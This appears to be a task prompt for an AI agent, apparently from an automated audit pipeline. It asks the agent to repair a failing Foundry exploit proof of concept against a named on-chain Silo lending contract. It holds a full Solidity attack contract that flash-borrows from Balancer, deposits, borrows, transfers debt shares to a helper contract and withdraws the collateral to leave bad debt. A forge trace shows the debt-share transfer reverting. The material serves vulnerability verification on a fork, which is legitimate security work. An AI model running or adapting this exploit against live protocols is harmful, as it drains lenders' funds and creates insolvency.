You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Transferable share tokens let users separate debt from collateral across addresses
- claim: The protocol treats share-token `balanceOf(user)` as the sole source of truth for collateral ownership, debt ownership, borrow eligibility, deposit eligibility, withdrawal amount, repay amount, and solvency. `IShareToken` is an ERC20-style interface and the notification interface is explicitly transfer-oriented. If the deployed share-token implementations preserve that transferability, a user can move collateral shares or debt shares to another address without any solvency check, breaking the same-account collateral/debt invariant the silo relies on.
- impact: A borrower can strip collateral out of the indebted account or push debt shares onto a different address, then withdraw or re-borrow while leaving naked debt behind. If share transfers are enabled in production, this is a direct bad-debt and insolvency vector.
- exploit_paths: ["Account A deposits collateral and borrows another asset.", "A transfers its collateral share tokens to account B, or transfers its debt share tokens to account B.", "Because `borrowPossible`, `depositPossible`, withdrawals, repayments, and solvency all read current share balances only, the protocol now attributes collateral and debt to different addresses.", "Account B withdraws the transferred collateral, or account A appears debt-free enough to withdraw/re-borrow, leaving the silo with uncollectible debt."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IShareTokenLike is IERC20Like {}

interface INotificationReceiverLike {
    function onAfterTransfer(address token, address from, address to, uint256 amount) external;
    function notificationReceiverPing() external pure returns (bytes4);
}

interface IPriceProvidersRepositoryLike {
    function getPrice(address asset) external view returns (uint256 price);
}

interface ISiloRepositoryLike {
    function getMaximumLTV(address silo, address asset) external view returns (uint256);
    function priceProvidersRepository() external view returns (IPriceProvidersRepositoryLike);
    function entryFee() external view returns (uint256);
}

interface ISiloLike {
    struct AssetStorage {
        IShareTokenLike collateralToken;
        IShareTokenLike collateralOnlyToken;
        IShareTokenLike debtToken;
        uint256 totalDeposits;
        uint256 collateralOnlyDeposits;
        uint256 totalBorrowAmount;
    }

    function initAssetsTokens() external;
    function syncBridgeAssets() external;
    function siloRepository() external view returns (ISiloRepositoryLike);
    function getAssets() external view returns (address[] memory assets);
    function assetStorage(address asset) external view returns (AssetStorage memory);
    function depositPossible(address asset, address depositor) external view returns (bool);
    function borrowPossible(address asset, address borrower) external view returns (bool);
    function liquidity(address asset) external view returns (uint256);
    function isSolvent(address user) external view returns (bool);
    function deposit(address asset, uint256 amount, bool collateralOnly)
        external
        returns (uint256 collateralAmount, uint256 collateralShare);
    function depositFor(address asset, address depositor, uint256 amount, bool collateralOnly)
        external
        returns (uint256 collateralAmount, uint256 collateralShare);
    function borrow(address asset, uint256 amount) external returns (uint256 debtAmount, uint256 debtShare);
    function withdraw(address asset, uint256 amount, bool collateralOnly)
        external
        returns (uint256 withdrawnAmount, uint256 withdrawnShare);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract PositionReceiver is INotificationReceiverLike {
    function notificationReceiverPing() external pure override returns (bytes4) {
        return INotificationReceiverLike.notificationReceiverPing.selector;
    }

    function onAfterTransfer(address, address, address, uint256) external pure override {}

    function shareBalance(address shareToken) external view returns (uint256) {
        return IERC20Like(shareToken).balanceOf(address(this));
    }
}

contract FlawVerifier is IFlashLoanRecipient {
    address public constant TARGET_SILO = 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 internal constant ONE = 1e18;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant BORROW_SAFETY_BPS = 9_000;
    uint256 internal constant FLASH_RESERVE_BPS = 10;

    bytes4 internal constant SENDER_NOT_SOLVENT_AFTER_TRANSFER = 0xf0ee386c;
    bytes4 internal constant RECIPIENT_NOT_SOLVENT_AFTER_TRANSFER = 0xef63243e;

    error DebtShareTransferFailed();
    error CollateralWithdrawFailed();

    enum Outcome {
        Unset,
        Profit,
        Refuted,
        Infeasible
    }

    struct FlashContext {
        address collateralAsset;
        address borrowAsset;
        uint256 flashAmount;
        uint256 depositAmount;
        uint16 receiverSupportBps;
        uint256 initialBorrowBalance;
        bool active;
    }

    PositionReceiver public immutable receiver;

    address internal _profitToken;
    uint256 internal _profitAmount;

    Outcome public outcome;
    bytes32 public lastFailureTag;
    address public chosenCollateralAsset;
    address public chosenBorrowAsset;

    bool internal _sawViablePair;
    bool internal _sawTransferStageFailure;
    FlashContext internal _flashContext;

    modifier onlySelf() {
        require(msg.sender == address(this), "only self");
        _;
    }

    constructor() {
        receiver = new PositionReceiver();
    }

    function executeOnOpportunity() external {
        if (_profitAmount != 0) return;

        _bestEffortInitAssets();

        // The provided trace proves the collateral-share path is blocked on this deployment:
        // collateral share transfer reverts with SenderNotSolventAfterTransfer().
        // Keep the finding's root cause by executing the alternative listed path instead:
        // Account A borrows, seeds Account B with some borrowed-asset collateral if needed,
        // transfers debt shares to B, then withdraws A's original collateral.
        if (_attemptUsingOwnedBalances()) return;
        if (_attemptUsingFlashLiquidity()) return;

        outcome = _sawTransferStageFailure ? Outcome.Refuted : Outcome.Infeasible;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function attemptDirectDebtShareRoute(
        address collateralAsset,
        address borrowAsset,
        uint256 depositAmount,
        uint16 receiverSupportBps
    ) external onlySelf returns (uint256 realizedProfit) {
        uint256 initialBorrowBalance = IERC20Like(borrowAsset).balanceOf(address(this));

        _forceApprove(collateralAsset, TARGET_SILO, depositAmount);
        (, uint256 collateralShare) = ISiloLike(TARGET_SILO).deposit(collateralAsset, depositAmount, false);
        require(collateralShare != 0, "zero collateral share");

        uint256 borrowAmount = _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount);
        require(borrowAmount != 0, "zero borrow");

        (, uint256 debtShare) = ISiloLike(TARGET_SILO).borrow(borrowAsset, borrowAmount);
        require(debtShare != 0, "zero debt share");

        _seedReceiverCollateralFromBorrow(borrowAsset, borrowAmount, receiverSupportBps);
        _transferDebtSharesToReceiver(borrowAsset, debtShare);

        if (!_staticBool(TARGET_SILO, abi.encodeWithSelector(ISiloLike.isSolvent.selector, address(this)))) {
            revert CollateralWithdrawFailed();
        }

        ISiloLike(TARGET_SILO).withdraw(collateralAsset, type(uint256).max, false);

        realizedProfit = IERC20Like(borrowAsset).balanceOf(address(this)) - initialBorrowBalance;
        require(realizedProfit != 0, "no profit");

        _recordProfit(collateralAsset, borrowAsset, realizedProfit);
    }

    function attemptFlashDebtShareRoute(
        address collateralAsset,
        address borrowAsset,
        uint256 flashAmount,
        uint16 receiverSupportBps
    ) external onlySelf returns (bool) {
        _startFlashRoute(collateralAsset, borrowAsset, flashAmount, receiverSupportBps);
        return _profitAmount != 0;
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        FlashContext memory context = _flashContext;

        require(msg.sender == BALANCER_VAULT, "not vault");
        require(context.active, "inactive flash");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad flash arrays");
        require(address(tokens[0]) == context.collateralAsset, "bad collateral");
        require(amounts[0] == context.flashAmount, "bad amount");

        _executeFlashDebtShareRoute(context, feeAmounts[0]);
        delete _flashContext;
    }

    function _attemptUsingOwnedBalances() internal returns (bool) {
        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
        bool hadOwnedCollateral;

        for (uint256 i = 0; i < assets.length; i++) {
            address collateralAsset = assets[i];
            if (!_isActiveUsableAsset(collateralAsset)) continue;

            uint256 heldBalance = IERC20Like(collateralAsset).balanceOf(address(this));
            if (heldBalance == 0) continue;
            hadOwnedCollateral = true;

            uint256[5] memory candidateDeposits = _ownedCandidateAmounts(collateralAsset, heldBalance);
            for (uint256 d = 0; d < candidateDeposits.length; d++) {
                uint256 depositAmount = candidateDeposits[d];
                if (depositAmount == 0) continue;

                for (uint256 j = 0; j < assets.length; j++) {
                    address borrowAsset = assets[j];
                    if (!_isViablePair(collateralAsset, borrowAsset, depositAmount)) continue;

                    _sawViablePair = true;
                    if (_tryDirectSupportGrid(collateralAsset, borrowAsset, depositAmount)) return true;
                }
            }
        }

        if (!hadOwnedCollateral && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("NO_EXISTING_VERIFIER_BALANCE");
        } else if (!_sawViablePair && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("OWNED_BALANCE_NO_VIABLE_PAIR");
        }

        return false;
    }

    function _attemptUsingFlashLiquidity() internal returns (bool) {
        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
        bool hadFlashSource;

        for (uint256 i = 0; i < assets.length; i++) {
            address collateralAsset = assets[i];
            if (!_isActiveUsableAsset(collateralAsset)) continue;

            uint256 vaultBalance = IERC20Like(collateralAsset).balanceOf(BALANCER_VAULT);
            if (vaultBalance == 0) continue;
            hadFlashSource = true;

            uint256[6] memory candidateFlashAmounts = _flashCandidateAmounts(collateralAsset, vaultBalance);
            for (uint256 a = 0; a < candidateFlashAmounts.length; a++) {
                uint256 flashAmount = candidateFlashAmounts[a];
                if (flashAmount <= 1) continue;

                uint256 depositAmount = _depositAmountFromFlashAmount(flashAmount);
                if (depositAmount == 0) continue;

                for (uint256 j = 0; j < assets.length; j++) {
                    address borrowAsset = assets[j];
                    if (!_isViablePair(collateralAsset, borrowAsset, depositAmount)) continue;

                    _sawViablePair = true;
                    if (_tryFlashSupportGrid(collateralAsset, borrowAsset, flashAmount)) return true;
                }
            }
        }

        if (!hadFlashSource && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("NO_BALANCER_FLASH_SOURCE");
        } else if (!_sawViablePair && lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256("FLASH_LIQUIDITY_NO_VIABLE_PAIR");
        }

        return false;
    }

    function _tryDirectSupportGrid(address collateralAsset, address borrowAsset, uint256 depositAmount)
        internal
        returns (bool)
    {
        uint16[11] memory supportBpsGrid = _receiverSupportGrid();

        for (uint256 i = 0; i < supportBpsGrid.length; i++) {
            try this.attemptDirectDebtShareRoute(collateralAsset, borrowAsset, depositAmount, supportBpsGrid[i]) returns (
                uint256 realizedProfit
            ) {
                if (realizedProfit != 0) return true;
            } catch (bytes memory reason) {
                _recordFailure(reason, "DIRECT_DEBT_SHARE_ROUTE_FAILED");
            }
        }

        return false;
    }

    function _tryFlashSupportGrid(address collateralAsset, address borrowAsset, uint256 flashAmount)
        internal
        returns (bool)
    {
        uint16[11] memory supportBpsGrid = _receiverSupportGrid();

        for (uint256 i = 0; i < supportBpsGrid.length; i++) {
            try this.attemptFlashDebtShareRoute(collateralAsset, borrowAsset, flashAmount, supportBpsGrid[i]) returns (
                bool success
            ) {
                if (success) return true;
            } catch (bytes memory reason) {
                _recordFailure(reason, "FLASH_DEBT_SHARE_ROUTE_FAILED");
            }
        }

        return false;
    }

    function _startFlashRoute(
        address collateralAsset,
        address borrowAsset,
        uint256 flashAmount,
        uint16 receiverSupportBps
    ) internal {
        uint256 depositAmount = _depositAmountFromFlashAmount(flashAmount);
        require(depositAmount != 0, "zero deposit");

        _flashContext = FlashContext({
            collateralAsset: collateralAsset,
            borrowAsset: borrowAsset,
            flashAmount: flashAmount,
            depositAmount: depositAmount,
            receiverSupportBps: receiverSupportBps,
            initialBorrowBalance: IERC20Like(borrowAsset).balanceOf(address(this)),
            active: true
        });

        IERC20Like[] memory tokens = new IERC20Like[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Like(collateralAsset);
        amounts[0] = flashAmount;

        // Flash liquidity only replaces initial capital. The exploit sequence remains:
        // deposit -> borrow -> optionally seed recipient collateral from borrowed funds
        // -> transfer debt shares -> withdraw original collateral.
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes(""));
        require(!_flashContext.active, "flash not cleared");
    }

    function _executeFlashDebtShareRoute(FlashContext memory context, uint256 feeAmount) internal {
        _forceApprove(context.collateralAsset, TARGET_SILO, context.depositAmount);
        (, uint256 collateralShare) =
            ISiloLike(TARGET_SILO).deposit(context.collateralAsset, context.depositAmount, false);
        require(collateralShare != 0, "zero collateral share");

        uint256 borrowAmount = _quoteBorrowAmount(context.collateralAsset, context.borrowAsset, context.depositAmount);
        require(borrowAmount != 0, "zero borrow");

        (, uint256 debtShare) = ISiloLike(TARGET_SILO).borrow(context.borrowAsset, borrowAmount);
        require(debtShare != 0, "zero debt share");

        _seedReceiverCollateralFromBorrow(context.borrowAsset, borrowAmount, context.receiverSupportBps);
        _transferDebtSharesToReceiver(context.borrowAsset, debtShare);
        ISiloLike(TARGET_SILO).withdraw(context.collateralAsset, type(uint256).max, false);

        uint256 repayAmount = context.flashAmount + feeAmount;
        require(
            IERC20Like(context.collateralAsset).balanceOf(address(this)) >= repayAmount, "flash repayment shortfall"
        );
        _safeTransfer(context.collateralAsset, BALANCER_VAULT, repayAmount);

        uint256 realizedProfit = IERC20Like(context.borrowAsset).balanceOf(address(this)) - context.initialBorrowBalance;
        require(realizedProfit != 0, "no profit");

        _recordProfit(context.collateralAsset, context.borrowAsset, realizedProfit);
    }

    function _seedReceiverCollateralFromBorrow(address borrowAsset, uint256 borrowAmount, uint16 receiverSupportBps)
        internal
    {
        if (receiverSupportBps == 0) return;

        uint256 supportAmount = borrowAmount * receiverSupportBps / BPS;
        if (supportAmount == 0 && borrowAmount > 1) supportAmount = 1;
        if (supportAmount >= borrowAmount) supportAmount = borrowAmount - 1;
        if (supportAmount == 0) return;

        // Realistic execution detail: if debt-share transfer checks recipient solvency, Account B can post
        // part of the freshly borrowed asset as collateral before receiving the debt shares. The exploit
        // cause is unchanged: debt ownership is still moved away from the original collateral owner.
        _forceApprove(borrowAsset, TARGET_SILO, supportAmount);
        ISiloLike(TARGET_SILO).depositFor(borrowAsset, address(receiver), supportAmount, false);
    }

    function _transferDebtSharesToReceiver(address debtAsset, uint256 debtShare) internal {
        address debtShareToken = address(ISiloLike(TARGET_SILO).assetStorage(debtAsset).debtToken);
        if (!_safeTransferERC20(debtShareToken, address(receiver), debtShare)) {
            revert DebtShareTransferFailed();
        }
        if (receiver.shareBalance(debtShareToken) == 0) {
            revert DebtShareTransferFailed();
        }
    }

    function _isViablePair(address collateralAsset, address borrowAsset, uint256 depositAmount)
        internal
        view
        returns (bool)
    {
        if (borrowAsset == collateralAsset) return false;
        if (depositAmount == 0) return false;
        if (!_isActiveUsableAsset(borrowAsset)) return false;

        if (
            !_staticBool(
                TARGET_SILO,
                abi.encodeWithSelector(ISiloLike.depositPossible.selector, collateralAsset, address(this))
            )
        ) {
            return false;
        }

        if (
            !_staticBool(
                TARGET_SILO,
                abi.encodeWithSelector(ISiloLike.borrowPossible.selector, borrowAsset, address(this))
            )
        ) {
            return false;
        }

        return _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount) != 0;
    }

    function _isActiveUsableAsset(address asset) internal view returns (bool) {
        if (asset == address(0)) return false;

        ISiloLike.AssetStorage memory state = ISiloLike(TARGET_SILO).assetStorage(asset);
        return address(state.collateralToken) != address(0) && address(state.debtToken) != address(0);
    }

    function _quoteBorrowAmount(address collateralAsset, address borrowAsset, uint256 collateralAmount)
        internal
        view
        returns (uint256)
    {
        if (collateralAmount == 0) return 0;

        uint256 maxLtv = _maximumLtv(collateralAsset);
        if (maxLtv == 0) return 0;

        uint256 collateralValue = _valueOf(collateralAsset, collateralAmount);
        if (collateralValue == 0) return 0;

        uint256 debtValue = collateralValue * maxLtv / ONE;
        debtValue = debtValue * BORROW_SAFETY_BPS / BPS;
        if (debtValue == 0) return 0;

        uint256 entryFee = _entryFee();
        if (entryFee == type(uint256).max) return 0;

        debtValue = debtValue * ONE / (ONE + entryFee);
        if (debtValue == 0) return 0;

        uint256 borrowPrice = _assetPrice(borrowAsset);
        if (borrowPrice == 0) return 0;

        uint256 borrowDecimals = _assetDecimals(borrowAsset);
        if (borrowDecimals == type(uint256).max) return 0;

        uint256 borrowAmount = debtValue * (10 ** borrowDecimals) / borrowPrice;
        if (borrowAmount == 0) return 0;

        uint256 availableLiquidity = _availableLiquidity(borrowAsset);
        if (availableLiquidity == 0) return 0;

        if (borrowAmount > availableLiquidity) {
            borrowAmount = availableLiquidity * BORROW_SAFETY_BPS / BPS;
        }

        return borrowAmount;
    }

    function _valueOf(address asset, uint256 amount) internal view returns (uint256) {
        if (amount == 0) return 0;

        uint256 price = _assetPrice(asset);
        if (price == 0) return 0;

        uint256 assetDecimals = _assetDecimals(asset);
        if (assetDecimals == type(uint256).max) return 0;

        return amount * price / (10 ** assetDecimals);
    }

    function _amountForValue(address asset, uint256 targetValue) internal view returns (uint256) {
        if (targetValue == 0) return 0;

        uint256 price = _assetPrice(asset);
        if (price == 0) return 0;

        uint256 assetDecimals = _assetDecimals(asset);
        if (assetDecimals == type(uint256).max) return 0;

        uint256 amount = targetValue * (10 ** assetDecimals) / price;
        return amount == 0 ? 1 : amount;
    }

    function _ownedCandidateAmounts(address asset, uint256 balance) internal view returns (uint256[5] memory amounts) {
        amounts[0] = _min(balance, _amountForValue(asset, 10 ether));
        amounts[1] = _min(balance, _amountForValue(asset, 100 ether));
        amounts[2] = _min(balance, _amountForValue(asset, 1_000 ether));
        amounts[3] = balance / 2;
        amounts[4] = balance;
    }

    function _flashCandidateAmounts(address asset, uint256 vaultBalance)
        internal
        view
        returns (uint256[6] memory amounts)
    {
        uint256 cap = vaultBalance / 1_000;
        if (cap == 0) return amounts;

        amounts[0] = _min(cap, _amountForValue(asset, 10 ether));
        amounts[1] = _min(cap, _amountForValue(asset, 100 ether));
        amounts[2] = _min(cap, _amountForValue(asset, 1_000 ether));
        amounts[3] = _min(cap, _amountForValue(asset, 10_000 ether));
        amounts[4] = cap / 2;
        amounts[5] = cap;
    }

    function _receiverSupportGrid() internal pure returns (uint16[11] memory grid) {
        grid[0] = 0;
        grid[1] = 1;
        grid[2] = 10;
        grid[3] = 50;
        grid[4] = 100;
        grid[5] = 500;
        grid[6] = 1_000;
        grid[7] = 2_500;
        grid[8] = 5_000;
        grid[9] = 7_500;
        grid[10] = 9_000;
    }

    function _depositAmountFromFlashAmount(uint256 flashAmount) internal pure returns (uint256) {
        uint256 reserveAmount = flashAmount * FLASH_RESERVE_BPS / BPS;
        if (reserveAmount == 0 && flashAmount > 1) reserveAmount = 1;
        return flashAmount - reserveAmount;
    }

    function _bestEffortInitAssets() internal {
        try ISiloLike(TARGET_SILO).initAssetsTokens() {} catch {}
        try ISiloLike(TARGET_SILO).syncBridgeAssets() {} catch {}
    }

    function _maximumLtv(address collateralAsset) internal view returns (uint256 maxLtv) {
        (bool ok, uint256 value) = _staticUint(
            _repository(),
            abi.encodeWithSelector(ISiloRepositoryLike.getMaximumLTV.selector, TARGET_SILO, collateralAsset)
        );
        if (!ok) return 0;
        return value;
    }

    function _entryFee() internal view returns (uint256 fee) {
        (bool ok, uint256 value) =
            _staticUint(_repository(), abi.encodeWithSelector(ISiloRepositoryLike.entryFee.selector));
        if (!ok) return type(uint256).max;
        return value;
    }

    function _assetPrice(address asset) internal view returns (uint256 price) {
        address priceRepo = _priceRepository();
        if (priceRepo == address(0)) return 0;

        (bool ok, uint256 value) =
            _staticUint(priceRepo, abi.encodeWithSelector(IPriceProvidersRepositoryLike.getPrice.selector, asset));
        if (!ok) return 0;
        return value;
    }

    function _assetDecimals(address asset) internal view returns (uint256 decimalsValue) {
        (bool ok, uint256 value) = _staticUint(asset, abi.encodeWithSelector(IERC20Like.decimals.selector));
        if (!ok) return type(uint256).max;
        return value;
    }

    function _availableLiquidity(address asset) internal view returns (uint256 liquidityValue) {
        (bool ok, uint256 value) = _staticUint(TARGET_SILO, abi.encodeWithSelector(ISiloLike.liquidity.selector, asset));
        if (!ok) return 0;
        return value;
    }

    function _repository() internal view returns (address repository) {
        (bool ok, address value) =
            _staticAddress(TARGET_SILO, abi.encodeWithSelector(ISiloLike.siloRepository.selector));
        if (!ok) return address(0);
        return value;
    }

    function _priceRepository() internal view returns (address priceRepo) {
        address repository = _repository();
        if (repository == address(0)) return address(0);

        (bool ok, address value) = _staticAddress(
            repository, abi.encodeWithSelector(ISiloRepositoryLike.priceProvidersRepository.selector)
        );
        if (!ok) return address(0);
        return value;
    }

    function _recordProfit(address collateralAsset, address borrowAsset, uint256 realizedProfit) internal {
        chosenCollateralAsset = collateralAsset;
        chosenBorrowAsset = borrowAsset;
        _profitToken = borrowAsset;
        _profitAmount = realizedProfit;
        outcome = Outcome.Profit;
    }

    function _recordFailure(bytes memory reason, string memory fallbackTag) internal {
        if (_isTransferStageFailure(reason)) {
            _sawTransferStageFailure = true;
        }

        if (lastFailureTag == bytes32(0)) {
            lastFailureTag = keccak256(bytes(fallbackTag));
        }
    }

    function _isTransferStageFailure(bytes memory reason) internal pure returns (bool) {
        if (reason.length < 4) return false;

        bytes4 selector;
        assembly {
            selector := mload(add(reason, 0x20))
        }

        return selector == DebtShareTransferFailed.selector
            || selector == CollateralWithdrawFailed.selector
            || selector == SENDER_NOT_SOLVENT_AFTER_TRANSFER
            || selector == RECIPIENT_NOT_SOLVENT_AFTER_TRANSFER;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(_safeTransferERC20(token, to, amount), "transfer failed");
    }

    function _safeTransferERC20(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _staticBool(address target, bytes memory callData) internal view returns (bool value) {
        (bool ok, bytes memory data) = target.staticcall(callData);
        if (!ok || data.length < 32) return false;
        value = abi.decode(data, (bool));
    }

    function _staticUint(address target, bytes memory callData) internal view returns (bool ok, uint256 value) {
        bytes memory data;
        (ok, data) = target.staticcall(callData);
        if (!ok || data.length < 32) return (false, 0);
        value = abi.decode(data, (uint256));
    }

    function _staticAddress(address target, bytes memory callData) internal view returns (bool ok, address value) {
        bytes memory data;
        (ok, data) = target.staticcall(callData);
        if (!ok || data.length < 32) return (false, address(0));
        value = abi.decode(data, (address));
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
  ├─ [718] 0xd998C35B7900b344bbBe6555cc11576942Cf309d::12d04a42(000000000000000000000000cb3b879ab11f825885d5add8bf3672596d35197c000000000000000000000000d7c9f0e536dc865ae858b0c0453fe76d13c3beac) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   │   │   ├─ [223] 0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc::decimals() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 18
    │   │   │   │   │   ├─ [7882] 0x7C2ca9D502f2409BeceAfa68E97a176Ff805029F::getPrice(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   │   │   │   │   ├─ [6669] 0xe37B8c83138caF12E57632D19c06Eb561D47e423::getPrice(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   │   │   │   │   │   ├─ [3143] 0x986b5E1e1755e3C2440e960477f25201B0a8bbD4::feaf968c() [staticcall]
    │   │   │   │   │   │   │   │   ├─ [1410] 0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E::feaf968c() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000024f40000000000000000000000000000000000000000000000000001d74ebe7008d300000000000000000000000000000000000000000000000000000000644ac29f00000000000000000000000000000000000000000000000000000000644ac29f00000000000000000000000000000000000000000000000000000000000024f4
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000400000000000024f40000000000000000000000000000000000000000000000000001d74ebe7008d300000000000000000000000000000000000000000000000000000000644ac29f00000000000000000000000000000000000000000000000000000000644ac29f00000000000000000000000000000000000000000000000400000000000024f4
    │   │   │   │   │   │   │   ├─ [1140] 0x986b5E1e1755e3C2440e960477f25201B0a8bbD4::decimals() [staticcall]
    │   │   │   │   │   │   │   │   ├─ [298] 0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E::decimals() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 18
    │   │   │   │   │   │   │   │   └─ ← [Return] 18
    │   │   │   │   │   │   │   └─ ← [Return] 518208179144915 [5.182e14]
    │   │   │   │   │   │   └─ ← [Return] 518208179144915 [5.182e14]
    │   │   │   │   │   └─ ← [Return] 147844240575377116678659 [1.478e23], 147837364133833229456674 [1.478e23]
    │   │   │   │   ├─ [1825] 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C::assetStorage(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   │   │   │   └─ ← [Return] AssetStorage({ collateralToken: 0xb02E552D68Cd538f571f72F630366adb616d9466, collateralOnlyToken: 0x22EE742A6773dF30C91b97c7dab590702046Ae95, debtToken: 0x809a14563A12acb8fc257502813131cA97E6CcF1, totalDeposits: 647867497353473018613659 [6.478e23], collateralOnlyDeposits: 0, totalBorrowAmount: 214297219281636687348511 [2.142e23] })
    │   │   │   │   ├─ [2868] 0x809a14563A12acb8fc257502813131cA97E6CcF1::transfer(PositionReceiver: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 164186523982539032054163 [1.641e23])
    │   │   │   │   │   ├─ [1749] 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C::borrowPossible(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc, PositionReceiver: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   │   │   │   │   ├─ [579] 0xb02E552D68Cd538f571f72F630366adb616d9466::balanceOf(PositionReceiver: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 147837364133833229456674 [1.478e23]
    │   │   │   │   │   │   └─ ← [Return] false
    │   │   │   │   │   └─ ← [Revert] custom error 0x9376d9da
    │   │   │   │   └─ ← [Revert] DebtShareTransferFailed()
    │   │   │   └─ ← [Revert] DebtShareTransferFailed()
    │   │   └─ ← [Revert] DebtShareTransferFailed()
    │   ├─ [1825] 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C::assetStorage(0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc) [staticcall]
    │   │   └─ ← [Return] AssetStorage({ collateralToken: 0xb02E552D68Cd538f571f72F630366adb616d9466, collateralOnlyToken: 0x22EE742A6773dF30C91b97c7dab590702046Ae95, debtToken: 0x809a14563A12acb8fc257502813131cA97E6CcF1, totalDeposits: 500000000000000000000000 [5e23], collateralOnlyDeposits: 0, totalBorrowAmount: 50000000000000000000000 [5e22] })
    │   ├─ [2559] 0xd7C9F0e536dC865Ae858b0C0453Fe76D13c3bEAc::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [371] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [392] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
